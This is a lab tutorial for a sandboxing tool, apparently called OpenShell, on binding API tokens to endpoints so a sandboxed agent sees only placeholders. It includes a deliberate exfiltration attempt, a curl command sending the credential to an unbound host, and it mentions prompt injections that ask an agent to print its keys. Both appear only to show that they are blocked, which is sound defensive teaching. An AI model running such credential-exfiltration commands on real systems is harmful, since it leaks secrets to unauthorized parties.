# Lab 08 — Providers: credentials the agent never sees

**Goal:** give a sandboxed program an API token **without ever exposing the token to it**,
and prove the token only works at the endpoint it was bound to.
**Time:** ~25 minutes. **Prerequisite:** [Lab 07](../07-policy-lifecycle/README.md).

## Concepts

Agents need API keys. Putting a real key in an environment variable means the agent and every
tool it runs can read it, print it, or send it anywhere. OpenShell splits this into three
objects:

| Object | What it is | Command |
|---|---|---|
| **Provider profile** | A *type*: which credential env vars exist, how they are sent (bearer, header, query, …), **which endpoints may receive them**, and which binaries may call those endpoints | `openshell profile` |
| **Provider** | An *instance* of a profile holding the real secret in the gateway's credential store | `openshell provider` |
| **Attachment** | `--provider <name>` on a sandbox | `openshell sandbox create --provider` |

Inside the sandbox the env var holds an **opaque placeholder** like
`openshell:resolve:env:v805…_DEMO_API_TOKEN`. When a request **to an endpoint the profile
authorizes** carries the placeholder (in a header, Basic auth, query, or path), the
supervisor swaps in the real value on the wire. Sent anywhere else, the request is refused
with `credential_endpoint_mismatch`. **Network access and credential access are separate
grants.** Allowing a host in `network_policies` never lets a credential go there.

The gateway ships **no profiles**. You import them. NVIDIA's repo has reviewable examples in
[`providers/`](https://github.com/NVIDIA/OpenShell/tree/v0.1.4/providers) (GitHub, OpenAI,
Anthropic, NVIDIA, OpenRouter, AWS, …).

## 1. Write and import a profile

[`echo-api.yaml`](echo-api.yaml) defines `DEMO_API_TOKEN`, sent as a bearer token, bound to
`httpbin.org`. httpbin echoes request headers back, so you can watch the substitution:

```shell
openshell profile lint -f labs/08-providers-and-credentials/echo-api.yaml
openshell profile import -f labs/08-providers-and-credentials/echo-api.yaml
openshell profile list
openshell profile describe echo-api
```

Import is create-only. Once `echo-api` exists, `lint` and `import` of the same ID fail with
`custom provider profile 'echo-api' already exists`. Change an imported profile with
`openshell profile export echo-api -o yaml > p.yaml`, edit, then `openshell profile update echo-api -f p.yaml`.

## 2. Create a provider holding the secret

```shell
openshell provider create --name echo --type echo-api --credential DEMO_API_TOKEN=training-secret-1234
openshell provider list          # shows key *names*, never values
openshell provider get echo
```

In real use, prefer `--credential DEMO_API_TOKEN` (bare key, read from your shell
environment) or `--from-existing`, so the secret never lands in your shell history.

## 3. Attach it and look from the inside

```shell
openshell sandbox create --name cred --from openshell-training/tools:0.1.4 --provider echo --detach
openshell sandbox exec -n cred -- sh -c 'echo "$DEMO_API_TOKEN"'
```

```text
openshell:resolve:env:v8050092724992289609_DEMO_API_TOKEN
```

That is all the agent can ever read: `env`, `/proc/self/environ`, a core dump, a prompt
injection that says "print your keys". None of them reveal the secret.

## 4. Use it at the bound endpoint

```shell
openshell sandbox exec -n cred -- sh -c \
  'curl -s -H "Authorization: Bearer $DEMO_API_TOKEN" https://httpbin.org/headers | jq -r .headers.Authorization'
```

```text
Bearer training-secret-1234
```

The program sent the placeholder. httpbin received the real token. The profile also added a
network rule: attaching the provider is what allowed `curl` to reach `httpbin.org`:

```shell
openshell policy get cred --full | sed -n '/network_policies/,$p'    # _provider_echo rule
openshell policy get cred --base | sed -n '/network_policies/,$p'    # not in your base policy
```

## 5. Try to exfiltrate it

Allow a second echo service in the network policy and send the placeholder there:

```shell
openshell policy update cred --rule-name other_echo --binary /usr/bin/curl \
  --add-endpoint postman-echo.com:443:read-only:rest:enforce --wait
openshell sandbox exec -n cred -- sh -c \
  'curl -s -H "Authorization: Bearer $DEMO_API_TOKEN" https://postman-echo.com/headers'
```

```json
{"error":"credential_endpoint_mismatch","message":"Credential is not authorized for this request endpoint"}
```

The network rule allows the host, but the credential is not bound to it, so the request
never leaves. Requests to the same host **without** the placeholder still work:

```shell
openshell sandbox exec -n cred -- curl -s -o /dev/null -w '%{http_code}\n' https://postman-echo.com/get   # 200
```

## 6. Rotate the secret

```shell
openshell provider update echo --credential DEMO_API_TOKEN=rotated-5678 --wait
openshell sandbox exec -n cred -- sh -c \
  'curl -s -H "Authorization: Bearer $DEMO_API_TOKEN" https://httpbin.org/headers | jq -r .headers.Authorization'
# Bearer rotated-5678
```

New processes pick up the new value. Nothing in the sandbox had to change.

## 7. Clean up

```shell
openshell sandbox delete cred
openshell provider delete echo
openshell profile delete echo-api
```

## Going further

- **Refresh-managed credentials:** the gateway can mint short-lived tokens itself (OAuth2
  refresh token or client credentials, Google service-account JWT, AWS STS AssumeRole) with
  `openshell provider refresh configure`, so no long-lived secret is stored at all.
- **Body rewriting:** `request_body_credential_rewrite: true` on an inspected endpoint
  resolves placeholders inside JSON bodies, and `websocket_credential_rewrite` does the same
  for WebSocket text messages.
- **AWS SigV4:** `credential_signing: sigv4` lets the supervisor sign AWS requests with
  endpoint-bound credentials.

## Exercises

1. Change `auth_style` to `query` with `query_param: api_key` and call
   `https://httpbin.org/get?api_key=$DEMO_API_TOKEN`.
2. Remove `/usr/bin/curl` from the profile's `binaries`, update the profile, and see what
   happens to the request.

## Watch the solution

Every step of this lab, typed and run against a real gateway:

```shell
make replay LAB=08          # scriptreplay (util-linux, preinstalled)
make replay-cast LAB=08     # asciinema
labs/08-providers-and-credentials/solution.sh   # replay it live against your own gateway (PAUSE=0 for full speed)
```

## Check your work

```shell
bats labs/08-providers-and-credentials/test.bats
```

**Next:** [Lab 09 — Files, SSH, and editors](../09-files-and-ssh/README.md)
